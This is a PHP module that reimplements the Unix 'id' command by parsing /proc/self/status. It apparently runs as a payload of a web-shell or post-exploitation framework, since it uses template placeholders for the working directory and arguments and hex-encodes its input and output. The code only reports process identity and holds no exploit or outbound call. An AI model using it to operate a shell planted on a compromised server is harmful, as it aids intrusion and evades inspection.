#<?php


class Module_id
{
    private $SUCC_CODE        = 0;
    private $ERR_CODE         = 1;

    private $FIELD_SEPARATOR  = ",";
    private $VALUE_SEPARATOR  = "=";

    private $RESPONSE_STATUS  = "status";
    private $RESPONSE_MESSAGE = "message";

    private $return_code;

    public function __construct($cwd)
    {
        $this->return_code = $this->SUCC_CODE;
        $cwd = $this->normalizePath($cwd);
        chdir($cwd);
    }

    private function normalizePath($currPath)
    {
        $currPath = str_replace("\"", "", $currPath);
        $currPath = str_replace("'", "", $currPath);
        $currPath = str_replace("\\", "/", $currPath);
        return $currPath;
    }

    private function parseArgs($args)
    {
        preg_match_all('/"[^"]+"|\'[^\']+\'|\S+/', $args, $matches);
        return $matches[0];
    }

    private function generateResponse($result)
    {
        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR . bin2hex($result);
        return bin2hex($response);
    }

    private function uid2Name($id)
    {
        $user = @posix_getpwuid($id);
        return $user["name"];
    }

    private function gid2Name($id)
    {
        $group = @posix_getgrgid($id);
        return $group["name"];
    }

    private function doID()
    {
        $result = "";
        
        try
        {
            $uid = "";
            $gid = "";
            $groups = "";

            $status_content = file_get_contents("/proc/self/status");
            $lines = explode("\n",$status_content);
            
            foreach ($lines as $line)
            {
                if (strpos($line, "Uid:") === 0)
                {
                    $fields = explode("\t", trim($line));

                    if (sizeof($fields) >= 2)
                    {
                        $uid = $fields[1] . "(" . $this->uid2Name($fields[1]) . ")";
                        $result .= "uid=$uid";
                    }

                }
                else if (strpos($line, "Gid:") === 0)
                {
                    $fields = explode("\t", trim($line));
                    
                    if (sizeof($fields) >= 2)
                    {
                        $gid = $fields[1] . "(" . $this->gid2Name($fields[1]) . ")";
                        $result .= " gid=$gid";
                    }

                }
                else if (strpos($line, "Groups:") === 0)
                {
                    $fields = explode("\t", trim($line));
                    if (sizeof($fields) >= 2)
                    {
                        $fields = array_slice($fields, 1);
                        $groups = "";
                        foreach ($fields as $group)
                        {
                            $groups .= trim($group) . "(" . $this->gid2Name($group) . "),";
                        }
                        $groups = substr($groups, 0, -1);
                        $result .= " groups=$groups";
                    }
                }
            }
            $result .= PHP_EOL;

        }
        catch (Exception $e)
        {
            $result .= $e->getMessage() . PHP_EOL;
        }

        return $result;
    }

    public function execute($args)
    {
        $result = "";
        $parsed_args = $this->parseArgs(hex2bin($args));

        try
        {
            $result = $this->doID();
        }
        catch (Exception $e)
        {
            $this->return_code = $this->ERR_CODE;
            $result = $e->getMessage() . PHP_EOL;
        }

        return $this->generateResponse($result);
    }

}

$cwd = '#{CWD}';
$args = '#{ARGS}';
$module = new Module_id($cwd);
print($module->execute($args));